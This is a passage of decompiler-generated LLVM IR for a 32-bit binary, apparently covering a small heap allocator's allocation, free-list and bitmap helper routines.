dec_label_pc_1278c:
  %v0_1278c = load i32, i32* @r1, align 4
  %v1_1278c = add i32 %v0_1278c, -1
  %v3_12790 = udiv i32 %v1_1278c, 32
  store i32 %v3_12790, i32* @ip, align 4
  %v0_12794 = load i32, i32* @r0, align 4
  %v4_12794 = mul nuw nsw i32 %v3_12790, 4
  %v5_12794 = add i32 %v0_12794, %v4_12794
  %v6_12794 = inttoptr i32 %v5_12794 to i32*
  %v7_12794 = load i32, i32* %v6_12794, align 4
  %v1_12798 = urem i32 %v1_1278c, 32
  %v7_127a0 = shl i32 1, %v1_12798
  %v8_127a0 = or i32 %v7_12794, %v7_127a0
  store i32 %v8_127a0, i32* %v6_12794, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12790, { 1, 0 }
  uselistorder i32 %v1_1278c, { 1, 0 }
}

define i32 @function_127b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_127b0:
  %v1_127b0 = add i32 %arg2, -1
  %v3_127b4 = udiv i32 %v1_127b0, 32
  %v4_127b8 = mul nuw nsw i32 %v3_127b4, 4
  %v5_127b8 = add i32 %v4_127b8, %arg1
  %v6_127b8 = inttoptr i32 %v5_127b8 to i32*
  %v7_127b8 = load i32, i32* %v6_127b8, align 4
  %v1_127bc = urem i32 %v1_127b0, 32
  %tmp = shl i32 -1, %v1_127bc
  %v8_127c4 = add i32 %tmp, -1
  %v9_127c4 = and i32 %v7_127b8, %v8_127c4
  store i32 %v9_127c4, i32* %v6_127b8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_127b0, { 1, 0 }
}

define i32 @function_127d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_127d4:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_127d4 = load i32, i32* @r4, align 4
  %v6_127d4 = load i32, i32* @r5, align 4
  %v9_127d4 = load i32, i32* @r6, align 4
  %v0_127d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_127d8 = icmp eq i32 %v0_127d8, 0
  %v2_127dc = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_127d8, label %bb, label %dec_label_pc_127e8

bb:                                               ; preds = %dec_label_pc_127d4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_127f0

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127d4
  %tmp = icmp ugt i32 %v0_127d8, -8
  br i1 %tmp, label %dec_label_pc_128f4, label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %bb, %dec_label_pc_127e8
  %v0_127f0 = phi i32 [ %v0_127d8, %dec_label_pc_127e8 ], [ 1, %bb ]
  %v1_127f0 = add i32 %v0_127f0, 4
  store i32 %v1_127f0, i32* %stack_var_-20, align 4
  store i32 %v2_127dc, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_26608.298 to i32), i32* %r0.global-to-local, align 4
  %v1_12808 = call i32 @function_13ab4()
  store i32 ptrtoint (i32** @global_var_203c0.302 to i32), i32* %r0.global-to-local, align 4
  %v3_12814 = call i32 @function_12a18(i32* bitcast (i32** @global_var_203c0.302 to i32*), i32 %v2_127dc)
  store i32 %v3_12814, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26608.298 to i32), i32* %r0.global-to-local, align 4
  store i32 75820, i32* @lr, align 4
  %v1_12828 = call i32 @function_13ab4()
  store i32 %v1_12828, i32* %r0.global-to-local, align 4
  %v2_1282c = icmp eq i32 %v3_12814, 0
  br i1 %v2_1282c, label %dec_label_pc_12834, label %dec_label_pc_128e4

dec_label_pc_12834:                               ; preds = %dec_label_pc_127f0
  %v2_12838 = load i32, i32* @global_var_26630.305, align 4
  store i32 %v2_12838, i32* @r4, align 4
  %v2_1283c = load i32, i32* %stack_var_-20, align 4
  %v3_12840 = icmp ult i32 %v2_1283c, %v2_12838
  br i1 %v3_12840, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_12834
  %v3_12844 = add i32 %v2_12838, -1
  %v2_12848 = add i32 %v3_12844, %v2_1283c
  %v2_1284c = sub i32 0, %v2_12838
  %v3_12850 = and i32 %v2_12848, %v2_1284c
  store i32 %v3_12850, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12834, %bb14
  store i32 ptrtoint (i32* @global_var_266d8.307 to i32), i32* %r0.global-to-local, align 4
  %v1_1285c = call i32 @function_13ab4()
  %v0_12860 = load i32, i32* @r4, align 4
  store i32 %v0_12860, i32* %r0.global-to-local, align 4
  %v1_12864 = call i32 @function_14020(i32 %v0_12860)
  store i32 %v1_12864, i32* %r0.global-to-local, align 4
  %v7_12868 = icmp eq i32 %v1_12864, -1
  br i1 %v7_12868, label %bb15, label %dec_label_pc_12874

bb15:                                             ; preds = %.thread3
  store i32 %v1_12864, i32* @r5, align 4
  br label %dec_label_pc_12888

dec_label_pc_12874:                               ; preds = %.thread3
  %v1_12874 = add i32 %v1_12864, 3
  %v1_12878 = and i32 %v1_12874, -4
  store i32 %v1_12878, i32* @r5, align 4
  %v9_1287c = icmp eq i32 %v1_12878, %v1_12864
  br i1 %v9_1287c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_12874
  %v3_12880 = sub i32 %v1_12878, %v1_12864
  store i32 %v3_12880, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12874, %bb16
  %v1_12884 = xor i1 %v9_1287c, true
  call void @__pseudo_cond_branch(i1 %v1_12884, i32 ptrtoint (i32* @global_var_14020.308 to i32))
  br label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_266d8.307 to i32), i32* %r0.global-to-local, align 4
  store i32 75928, i32* @lr, align 4
  %v1_12894 = call i32 @function_13ab4()
  store i32 %v1_12894, i32* %r0.global-to-local, align 4
  %v0_12898 = load i32, i32* @r5, align 4
  %v7_12898 = icmp eq i32 %v0_12898, -1
  br i1 %v7_12898, label %dec_label_pc_128f4, label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %dec_label_pc_12888
  store i32 ptrtoint (i32* @global_var_26608.298 to i32), i32* %r0.global-to-local, align 4
  %v1_128ac = call i32 @function_13ab4()
  %v0_128b0 = load i32, i32* @r4, align 4
  %v0_128b4 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_203c0.302 to i32), i32* %r0.global-to-local, align 4
  %v4_128bc = call i32 @function_12ae0(i32* bitcast (i32** @global_var_203c0.302 to i32*), i32 %v0_128b4, i32 %v0_128b0)
  store i32 ptrtoint (i32** @global_var_203c0.302 to i32), i32* %r0.global-to-local, align 4
  %v3_128c8 = call i32 @function_12a18(i32* bitcast (i32** @global_var_203c0.302 to i32*), i32 %v2_127dc)
  store i32 %v3_128c8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26608.298 to i32), i32* %r0.global-to-local, align 4
  store i32 75996, i32* @lr, align 4
  %v1_128d8 = call i32 @function_13ab4()
  store i32 %v1_128d8, i32* %r0.global-to-local, align 4
  %v2_128dc = icmp eq i32 %v3_128c8, 0
  br i1 %v2_128dc, label %dec_label_pc_128f4, label %dec_label_pc_128e4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_128a0
  %v1_128e8 = phi i32 [ %v3_12814, %dec_label_pc_127f0 ], [ %v3_128c8, %dec_label_pc_128a0 ]
  %v2_128e4 = load i32, i32* %stack_var_-20, align 4
  %v2_128e8 = inttoptr i32 %v1_128e8 to i32*
  store i32 %v2_128e4, i32* %v2_128e8, align 4
  %v3_128e8 = load i32, i32* %r4.global-to-local, align 4
  %v4_128e8 = add i32 %v3_128e8, 4
  store i32 %v4_128e8, i32* %r4.global-to-local, align 4
  %v2_128ec = icmp eq i32 %v4_128e8, 0
  br i1 %v2_128ec, label %dec_label_pc_128f4, label %dec_label_pc_12904

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128e4, %dec_label_pc_128a0, %dec_label_pc_12888, %dec_label_pc_127e8
  %v0_128f4 = call i32 @function_10a18()
  store i32 %v0_128f4, i32* %r0.global-to-local, align 4
  %v2_128fc = inttoptr i32 %v0_128f4 to i32*
  store i32 12, i32* %v2_128fc, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12904

dec_label_pc_12904:                               ; preds = %dec_label_pc_128e4, %dec_label_pc_128f4
  %v0_12904 = phi i32 [ %v4_128e8, %dec_label_pc_128e4 ], [ 0, %dec_label_pc_128f4 ]
  store i32 %v0_12904, i32* %r0.global-to-local, align 4
  store i32 %v3_127d4, i32* @r4, align 4
  store i32 %v6_127d4, i32* @r5, align 4
  store i32 %v9_127d4, i32* @r6, align 4
  ret i32 %v0_12904

; uselistorder directives
  uselistorder i32 %v0_12904, { 1, 0 }
  uselistorder i32 %v3_128c8, { 1, 0, 2 }
  uselistorder i32 %v1_12878, { 1, 0, 2 }
  uselistorder i32 %v1_12864, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %v3_12814, { 1, 0, 2 }
  uselistorder i32 %v0_127d8, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 6, 8, 4, 7, 9, 10, 11, 3, 13, 12, 5, 15, 14, 2, 16, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_12904, { 1, 0 }
  uselistorder label %dec_label_pc_128e4, { 1, 0 }
  uselistorder label %dec_label_pc_12888, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_127f0, { 1, 0 }
}

define i32 @function_12928(i32 %arg1) local_unnamed_addr {
dec_label_pc_12928:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_12928 = icmp eq i32 %arg1, 0
  %v3_1292c = load i32, i32* @r4, align 4
  store i32 %v3_1292c, i32* %stack_var_-24, align 4
  %v6_1292c = load i32, i32* @r5, align 4
  %v9_1292c = load i32, i32* @r6, align 4
  %v15_1292c = load i32, i32* @r8, align 4
  br i1 %v2_12928, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_12928
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_12928
  %v1_12934 = add i32 %arg1, -4
  %v2_12934 = inttoptr i32 %v1_12934 to i32*
  %v3_12934 = load i32, i32* %v2_12934, align 4
  store i32 %v3_12934, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_203c0.302 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_12934, i32* @r4, align 4
  %v1_1294c = call i32 @function_13ab4()
  %v0_12950 = load i32, i32* @r4, align 4
  %v0_12954 = load i32, i32* @r5, align 4
  %v4_1295c = call i32 @function_12ae0(i32* bitcast (i32** @global_var_203c0.302 to i32*), i32 %v0_12950, i32 %v0_12954)
  %v1_12964 = inttoptr i32 %v4_1295c to i32*
  %v2_12964 = load i32, i32* %v1_12964, align 4
  store i32 %v2_12964, i32* %r6.global-to-local, align 4
  %v2_12968 = load i32, i32* @global_var_26630.305, align 4
  %v4_1296c = mul i32 %v2_12968, 8
  %v6_1296c = icmp ult i32 %v2_12964, %v4_1296c
  store i32 %v4_1295c, i32* @r4, align 4
  br i1 %v6_1296c, label %dec_label_pc_129ac, label %dec_label_pc_12978

dec_label_pc_12978:                               ; preds = %bb11
  %v1_12980 = call i32 @function_13ab4()
  %v1_12988 = call i32 @function_14020(i32 0)
  %v0_1298c = load i32, i32* @r4, align 4
  %v1_1298c = add i32 %v0_1298c, 12
  store i32 %v1_1298c, i32* @r5, align 4
  %v9_12990 = icmp eq i32 %v1_1298c, %v1_12988
  br i1 %v9_12990, label %dec_label_pc_129b4, label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %dec_label_pc_12978
  %v1_129a4 = call i32 @function_13ab4()
  br label %dec_label_pc_129ac

dec_label_pc_129ac:                               ; preds = %bb11, %dec_label_pc_12998, %bb14
  %v2_129ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_129ac, i32* @r4, align 4
  store i32 %v6_1292c, i32* @r5, align 4
  store i32 %v9_1292c, i32* %r6.global-to-local, align 4
  store i32 %v15_1292c, i32* %r8.global-to-local, align 4
  %v0_129b0 = call i32 @function_13ab4()
  %v0_129b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_129b4

dec_label_pc_129b4:                               ; preds = %dec_label_pc_12978, %dec_label_pc_129ac
  %v1_129bc = phi i32 [ %v0_1298c, %dec_label_pc_12978 ], [ %v0_129b4.pre, %dec_label_pc_129ac ]
  %v1_129b4 = add i32 %v1_129bc, 4
  %v2_129b4 = inttoptr i32 %v1_129b4 to i32*
  %v3_129b4 = load i32, i32* %v2_129b4, align 4
  %v2_129b8 = icmp eq i32 %v3_129b4, 0
  br i1 %v2_129b8, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_129b4
  %v2_129bc = add i32 %v1_129bc, 8
  %v3_129bc = inttoptr i32 %v2_129bc to i32*
  %v4_129bc = load i32, i32* %v3_129bc, align 4
  %v3_129c0 = add i32 %v3_129b4, 8
  %v4_129c0 = inttoptr i32 %v3_129c0 to i32*
  store i32 %v4_129bc, i32* %v4_129c0, align 4
  %v0_129c4.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_129b4, %bb12
  %v0_129c4 = phi i32 [ %v1_129bc, %dec_label_pc_129b4 ], [ %v0_129c4.pre, %bb12 ]
  %v1_129c4 = add i32 %v0_129c4, 8
  %v2_129c4 = inttoptr i32 %v1_129c4 to i32*
  %v3_129c4 = load i32, i32* %v2_129c4, align 4
  %v1_129c8 = add i32 %v0_129c4, 4
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  %v3_129c8 = load i32, i32* %v2_129c8, align 4
  %v2_129cc = icmp eq i32 %v3_129c4, 0
  br i1 %v2_129cc, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_129d0 = add i32 %v3_129c4, 4
  %v4_129d0 = inttoptr i32 %v3_129d0 to i32*
  store i32 %v3_129c8, i32* %v4_129d0, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_129d4 = load i32, i32* %r8.global-to-local, align 4
  %v3_129d4 = inttoptr i32 %v2_129d4 to i32*
  store i32 %v3_129c8, i32* %v3_129d4, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_129e4 = call i32 @function_13ab4()
  %v0_129e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_129e8 = load i32, i32* @r4, align 4
  %v0_129f0 = load i32, i32* @r5, align 4
  %v2_129e8 = sub i32 12, %v0_129e8
  %v1_129ec = add i32 %v2_129e8, %v1_129e8
  %v2_129f0 = sub i32 %v1_129ec, %v0_129f0
  %v1_129f4 = call i32 @function_14020(i32 %v2_129f0)
  br label %dec_label_pc_129ac

; uselistorder directives
  uselistorder i32 %v0_129c4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_14020, { 2, 1, 0 }
  uselistorder i32** @global_var_203c0.302, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_129b4, { 1, 0 }
  uselistorder label %dec_label_pc_129ac, { 2, 1, 0 }
}

define i32 @function_12a18(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12a18:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_12a18 = inttoptr i32 %arg2 to i32*
  %v2_12a18 = load i32, i32* %v1_12a18, align 4
  %v3_12a1c = load i32, i32* @r4, align 4
  store i32 %v3_12a1c, i32* %stack_var_-8, align 4
  %v1_12a20 = add i32 %v2_12a18, 3
  %v1_12a24 = and i32 %v1_12a20, -4
  store i32 %v1_12a24, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12a2c = icmp ugt i32 %v1_12a24, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12a34 = load i32, i32* %arg1, align 4
  store i32 %v2_12a34, i32* %r0.global-to-local, align 4
  br i1 %v2_12a2c, label %dec_label_pc_12aa0.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_12a18
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12aa0.preheader

dec_label_pc_12aa0.preheader:                     ; preds = %dec_label_pc_12a18, %bb
  %v1_12a54 = phi i32 [ %v1_12a24, %dec_label_pc_12a18 ], [ 12, %bb ]
  %v2_12aa09 = icmp eq i32 %v2_12a34, 0
  br i1 %v2_12aa09, label %dec_label_pc_12aa8, label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12aa0.preheader, %dec_label_pc_12a9c
  %v2_12a58 = phi i32 [ %v3_12a9c, %dec_label_pc_12a9c ], [ %v2_12a34, %dec_label_pc_12aa0.preheader ]
  %v1_12a40 = inttoptr i32 %v2_12a58 to i32*
  %v2_12a40 = load i32, i32* %v1_12a40, align 4
  store i32 %v2_12a40, i32* @ip, align 4
  %v3_12a44 = icmp ult i32 %v2_12a40, %v1_12a54
  br i1 %v3_12a44, label %dec_label_pc_12a9c, label %dec_label_pc_12a4c

dec_label_pc_12a4c:                               ; preds = %dec_label_pc_12a40
  %v1_12a4c = add i32 %v1_12a54, 44
  %v3_12a50 = icmp ult i32 %v2_12a40, %v1_12a4c
  br i1 %v3_12a50, label %dec_label_pc_12a60, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_12a4c
  %v2_12a44.le = sub i32 %v2_12a40, %v1_12a54
  store i32 %v2_12a44.le, i32* %v1_12a40, align 4
  %v0_12a8c.pre = load i32, i32* @ip, align 4
  %v0_12a94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a4c
  %v1_12a60 = add i32 %v2_12a58, 4
  %v2_12a60 = inttoptr i32 %v1_12a60 to i32*
  %v3_12a60 = load i32, i32* %v2_12a60, align 4
  store i32 %v3_12a60, i32* %r2.global-to-local, align 4
  %v2_12a64 = icmp eq i32 %v3_12a60, 0
  br i1 %v2_12a64, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_12a60
  %v2_12a68 = add i32 %v2_12a58, 8
  %v3_12a68 = inttoptr i32 %v2_12a68 to i32*
  %v4_12a68 = load i32, i32* %v3_12a68, align 4
  %v3_12a6c = add i32 %v3_12a60, 8
  %v4_12a6c = inttoptr i32 %v3_12a6c to i32*
  store i32 %v4_12a68, i32* %v4_12a6c, align 4
  %v0_12a70.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12a60, %bb27
  %v0_12a70 = phi i32 [ %v2_12a58, %dec_label_pc_12a60 ], [ %v0_12a70.pre, %bb27 ]
  %v1_12a70 = add i32 %v0_12a70, 8
  %v2_12a70 = inttoptr i32 %v1_12a70 to i32*
  %v3_12a70 = load i32, i32* %v2_12a70, align 4
  %v1_12a74 = add i32 %v0_12a70, 4
  %v2_12a74 = inttoptr i32 %v1_12a74 to i32*
  %v3_12a74 = load i32, i32* %v2_12a74, align 4
  %v2_12a78 = icmp eq i32 %v3_12a70, 0
  br i1 %v2_12a78, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_12a7c = add i32 %v3_12a70, 4
  %v4_12a7c = inttoptr i32 %v3_12a7c to i32*
  store i32 %v3_12a74, i32* %v4_12a7c, align 4
  %v1_12a84 = load i32, i32* @ip, align 4
  store i32 %v1_12a84, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_12a80 = load i32, i32* %r1.global-to-local, align 4
  %v3_12a80 = inttoptr i32 %v2_12a80 to i32*
  store i32 %v3_12a74, i32* %v3_12a80, align 4
  %v1_12a88.pre = load i32, i32* @ip, align 4
  store i32 %v1_12a88.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_12a94 = phi i32 [ %v0_12a94.pre, %.thread._crit_edge ], [ %v1_12a84, %bb28 ], [ %v1_12a88.pre, %.thread5 ]
  %v0_12a8c = phi i32 [ %v0_12a8c.pre, %.thread._crit_edge ], [ %v1_12a84, %bb28 ], [ %v1_12a88.pre, %.thread5 ]
  %v1_12a8c = load i32, i32* %r0.global-to-local, align 4
  %v2_12a8c = sub i32 %v1_12a8c, %v0_12a8c
  %v1_12a90 = add i32 %v2_12a8c, 12
  store i32 %v1_12a90, i32* %r0.global-to-local, align 4
  %v1_12a94 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a94 = inttoptr i32 %v1_12a94 to i32*
  store i32 %v0_12a94, i32* %v2_12a94, align 4
  %v2_12a98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12a98, i32* %r4.global-to-local, align 4
  ret i32 %v1_12a90

dec_label_pc_12a9c:                               ; preds = %dec_label_pc_12a40
  %v1_12a9c = add i32 %v2_12a58, 4
  %v2_12a9c = inttoptr i32 %v1_12a9c to i32*
  %v3_12a9c = load i32, i32* %v2_12a9c, align 4
  store i32 %v3_12a9c, i32* %r0.global-to-local, align 4
  %v2_12aa0 = icmp eq i32 %v3_12a9c, 0
  br i1 %v2_12aa0, label %dec_label_pc_12aa0.dec_label_pc_12aa8_crit_edge, label %dec_label_pc_12a40

dec_label_pc_12aa0.dec_label_pc_12aa8_crit_edge:  ; preds = %dec_label_pc_12a9c
  br label %dec_label_pc_12aa8

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12aa0.dec_label_pc_12aa8_crit_edge, %dec_label_pc_12aa0.preheader
  store i32 %v3_12a1c, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12a9c, { 1, 2, 0 }
  uselistorder i32 %v0_12a70, { 1, 0 }
  uselistorder i32 %v2_12a40, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12a58, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_12a54, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12a40, { 1, 0 }
  uselistorder label %dec_label_pc_12aa0.preheader, { 1, 0 }
}

define i32 @function_12aac() local_unnamed_addr {
dec_label_pc_12aac:
  %v0_12aac = load i32, i32* @r2, align 4
  %v2_12aac = icmp eq i32 %v0_12aac, 0
  %v0_12ab0 = load i32, i32* @r3, align 4
  %v1_12ab0 = load i32, i32* @r1, align 4
  %v2_12ab0 = add i32 %v1_12ab0, 4
  %v3_12ab0 = inttoptr i32 %v2_12ab0 to i32*
  store i32 %v0_12ab0, i32* %v3_12ab0, align 4
  %v0_12ab4 = load i32, i32* @r2, align 4
  %v1_12ab4 = load i32, i32* @r1, align 4
  %v2_12ab4 = add i32 %v1_12ab4, 8
  %v3_12ab4 = inttoptr i32 %v2_12ab4 to i32*
  store i32 %v0_12ab4, i32* %v3_12ab4, align 4
  %v1_12abc = load i32, i32* @r1, align 4
  br i1 %v2_12aac, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12aac
  %v2_12ab8 = load i32, i32* @r2, align 4
  %v3_12ab8 = add i32 %v2_12ab8, 4
  %v4_12ab8 = inttoptr i32 %v3_12ab8 to i32*
  store i32 %v1_12abc, i32* %v4_12ab8, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_12aac
  %v2_12abc = load i32, i32* @r0, align 4
  %v3_12abc = inttoptr i32 %v2_12abc to i32*
  store i32 %v1_12abc, i32* %v3_12abc, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_12ac0 = load i32, i32* @r3, align 4
  %v2_12ac0 = icmp eq i32 %v0_12ac0, 0
  br i1 %v2_12ac0, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_12ac4 = load i32, i32* @r1, align 4
  %v3_12ac4 = add i32 %v0_12ac0, 8
  %v4_12ac4 = inttoptr i32 %v3_12ac4 to i32*
  store i32 %v1_12ac4, i32* %v4_12ac4, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_12ac8 = load i32, i32* @r0, align 4
  ret i32 %v1_12ac8

; uselistorder directives
  uselistorder i32 %v1_12abc, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_12acc() local_unnamed_addr {
dec_label_pc_12acc:
  %v0_12acc = load i32, i32* @r2, align 4
  %v2_12acc = icmp eq i32 %v0_12acc, 0
  %v1_12ad0 = load i32, i32* @r1, align 4
  br i1 %v2_12acc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12acc
  %v2_12ad0 = load i32, i32* @r0, align 4
  %v3_12ad0 = inttoptr i32 %v2_12ad0 to i32*
  store i32 %v1_12ad0, i32* %v3_12ad0, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_12acc
  %v3_12ad4 = add i32 %v0_12acc, 4
  %v4_12ad4 = inttoptr i32 %v3_12ad4 to i32*
  store i32 %v1_12ad0, i32* %v4_12ad4, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_12ad8 = load i32, i32* @r2, align 4
  %v1_12ad8 = load i32, i32* @r1, align 4
  %v2_12ad8 = add i32 %v1_12ad8, 8
  %v3_12ad8 = inttoptr i32 %v2_12ad8 to i32*
  store i32 %v0_12ad8, i32* %v3_12ad8, align 4
  %v1_12adc = load i32, i32* @r0, align 4
  ret i32 %v1_12adc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_12ae0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12ae0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12ae0 = load i32, i32* @r4, align 4
  store i32 %v3_12ae0, i32* %stack_var_-20, align 4
  %v2_12ae4 = load i32, i32* %arg1, align 4
  store i32 %v2_12ae4, i32* %r4.global-to-local, align 4
  %v2_12ae8 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12b042 = icmp eq i32 %v2_12ae4, 0
  br i1 %v2_12b042, label %dec_label_pc_12bb4, label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %dec_label_pc_12ae0, %dec_label_pc_12afc
  %v0_12b44 = phi i32 [ %v0_12b4c, %dec_label_pc_12afc ], [ 0, %dec_label_pc_12ae0 ]
  %v0_12b4c = phi i32 [ %v3_12b00, %dec_label_pc_12afc ], [ %v2_12ae4, %dec_label_pc_12ae0 ]
  %v1_12b085.in = phi i32 [ %v3_12b00, %dec_label_pc_12afc ], [ %v2_12ae4, %dec_label_pc_12ae0 ]
  %v1_12b085 = add i32 %v1_12b085.in, 12
  %v3_12af4 = icmp ult i32 %v1_12b085, %arg2
  br i1 %v3_12af4, label %dec_label_pc_12afc, label %dec_label_pc_12b14

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12af4
  store i32 %v0_12b4c, i32* %r6.global-to-local, align 4
  %v1_12b00 = add i32 %v0_12b4c, 4
  %v2_12b00 = inttoptr i32 %v1_12b00 to i32*
  %v3_12b00 = load i32, i32* %v2_12b00, align 4
  store i32 %v3_12b00, i32* %r4.global-to-local, align 4
  %v2_12b04 = icmp eq i32 %v3_12b00, 0
  br i1 %v2_12b04, label %dec_label_pc_12b04.dec_label_pc_12bb4.loopexit_crit_edge, label %dec_label_pc_12af4

dec_label_pc_12b14:                               ; preds = %dec_label_pc_12af4
  %v1_12b14 = inttoptr i32 %v0_12b4c to i32*
  %v2_12b14 = load i32, i32* %v1_12b14, align 4
  store i32 %v2_12b14, i32* @ip, align 4
  %v2_12b18 = sub i32 %v0_12b4c, %v2_12b14
  %v1_12b1c = add i32 %v2_12b18, 12
  %v3_12b20 = icmp uge i32 %v1_12b1c, %v2_12ae8
  %v9_12b20 = icmp eq i32 %v1_12b1c, %v2_12ae8
  %v2_12b24 = xor i1 %v9_12b20, true
  %v3_12b24 = and i1 %v3_12b20, %v2_12b24
  br i1 %v3_12b24, label %dec_label_pc_12bb4, label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12b14
  %v2_12b28 = add i32 %v2_12b14, %arg3
  store i32 %v2_12b28, i32* %r7.global-to-local, align 4
  br i1 %v9_12b20, label %dec_label_pc_12b30, label %dec_label_pc_12b5c

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b28
  %v2_12b30 = icmp eq i32 %v0_12b44, 0
